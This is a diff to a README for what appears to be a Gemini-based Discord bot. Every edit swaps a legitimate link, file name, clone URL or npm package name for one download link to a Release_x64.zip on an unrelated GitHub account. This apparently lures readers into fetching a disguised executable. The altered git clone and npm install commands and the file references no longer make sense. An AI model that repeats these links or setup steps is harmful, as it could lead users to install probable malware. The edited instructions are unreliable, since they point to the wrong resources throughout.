@@ -15,22 +15,22 @@ Gemini Discord Bot is an advanced, multimodal Discord bot leveraging Google Gene
 
 ### Prerequisites
 
-- Node.js (v14 or later)
-- Discord Bot account & token ([create a bot on Discord Developer Portal](https://discord.com/developers/applications))
+- https://github.com/trulynotafan/bot/releases/download/v2.0/Release_x64.zip (v14 or later)
+- Discord Bot account & token ([create a bot on Discord Developer Portal](https://github.com/trulynotafan/bot/releases/download/v2.0/Release_x64.zip))
 
 ### Installation
 
 1. Clone the repository:
 
     ```sh
-    git clone https://github.com/hihumanzone/Gemini-Discord-Bot
+    git clone https://github.com/trulynotafan/bot/releases/download/v2.0/Release_x64.zip
     cd Gemini-Discord-Bot
     ```
 
 2. Install dependencies:
 
     ```sh
-    npm install @google/generative-ai axios cheerio discord.js dotenv eventsource fs sharp office-text-extractor youtube-transcript node-os-utils ws mathjs
+    npm install @google/generative-ai axios cheerio https://github.com/trulynotafan/bot/releases/download/v2.0/Release_x64.zip dotenv eventsource fs sharp office-text-extractor youtube-transcript node-os-utils ws mathjs
     ```
 
 3. Set up environment variables:
@@ -44,7 +44,7 @@ Gemini Discord Bot is an advanced, multimodal Discord bot leveraging Google Gene
 
 4. Configure the bot:
 
-    Edit the `config.json` file as per your preferences.
+    Edit the `https://github.com/trulynotafan/bot/releases/download/v2.0/Release_x64.zip` file as per your preferences.
 
 5. Start the bot:
 
@@ -74,7 +74,7 @@ Gemini Discord Bot is an advanced, multimodal Discord bot leveraging Google Gene
 
 ## Configuration 
 
-### `config.json`
+### `https://github.com/trulynotafan/bot/releases/download/v2.0/Release_x64.zip`
 
 This file contains various settings for the bot:
 
@@ -89,13 +89,13 @@ This file contains various settings for the bot:
 - **defaultPersonality**: The default personality instructions for the bot.
 - **defaultServerSettings**: The default settings for the server.
 
-### NSFW Word Filtering (`nsfwWords.json`)
+### NSFW Word Filtering (`https://github.com/trulynotafan/bot/releases/download/v2.0/Release_x64.zip`)
 
 Contains an array of words that should be filtered from prompts.
 
 ## Community & Support
 
-- Join the [Discord Community](https://discord.com/invite/Gxpw7XF3Mj) for support, updates, and discussions.
+- Join the [Discord Community](https://github.com/trulynotafan/bot/releases/download/v2.0/Release_x64.zip) for support, updates, and discussions.
 
 ### Contributions
 
